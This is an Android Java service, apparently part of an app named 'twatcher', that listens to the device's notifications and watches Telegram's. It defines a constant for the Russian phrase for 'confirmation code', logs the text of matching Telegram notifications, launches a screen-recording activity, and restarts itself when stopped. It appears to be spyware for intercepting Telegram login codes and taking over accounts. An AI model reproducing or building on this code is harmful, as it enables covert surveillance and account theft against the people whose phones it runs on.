package com.example.twatcher;

import android.app.Notification;
import android.content.Intent;
import android.os.IBinder;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import androidx.annotation.Nullable;

import java.util.Timer;
import java.util.TimerTask;

public class AutoStartService extends NotificationListenerService {

    private static final String TAG = "TEST: ";
    private static final String NEEDED_APP_PACKAGE = "org.telegram.messenger";
    private static final String NEEDED_APP_NOTIFICATION_TITLE = "Telegram";
    private static final String NEEDED_APP_NOTIFICATION_MESSAGE = "Код подтверждения";
    public int counter = 0;
    private Timer timer;
    private TimerTask timerTask;

    public AutoStartService() {
        Log.i(TAG, "AutoStartService: Here we go.....");
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        Log.i(TAG, "onBind");

        return super.onBind(intent);
    }

    @Override
    public void onCreate() {
        Log.i(TAG, "onCreate");
        super.onCreate();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        Log.i(TAG, "onStartCommand");

        startTimer();
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.i(TAG, "onDestroy: Service is destroyed :( ");
        Intent broadcastIntent = new Intent(this, RestartBroadcastReceiver.class);

        sendBroadcast(broadcastIntent);
        stoptimertask();
    }

    public void startTimer() {
        timer = new Timer();

        //initialize the TimerTask's job
        initialiseTimerTask();

        //schedule the timer, to wake up every 1 second
        timer.schedule(timerTask, 1000, 1000); //
    }

    public void initialiseTimerTask() {
        timerTask = new TimerTask() {
            @Override
            public void run() {
                Log.i(TAG, "Timer is running " + counter++);
            }
        };
    }

    public void stoptimertask() {
        if (timer != null) {
            timer.cancel();
            timer = null;
        }
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn){
        String notificationApp = sbn.getPackageName();

        if(notificationApp != null && notificationApp.equals(NEEDED_APP_PACKAGE)) {
            String notificationTitle = sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TITLE).toString();
            String notificationText = sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TEXT).toString();

            if(notificationTitle != null && notificationText != null &&
                    notificationTitle.equals(NEEDED_APP_NOTIFICATION_TITLE)) {
                Log.i(TAG, "onNotificationPosted: " + sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TEXT).toString());
                Log.i(TAG, "onNotificationPosted: " + sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TITLE).toString());

                Intent dialogIntent = new Intent(this, ScreenRecordingAcitivity.class);
                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(dialogIntent);
            }
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn){
        //Log.i(TAG, "onNotificationRemoved: " + sbn.getTag());
    }
}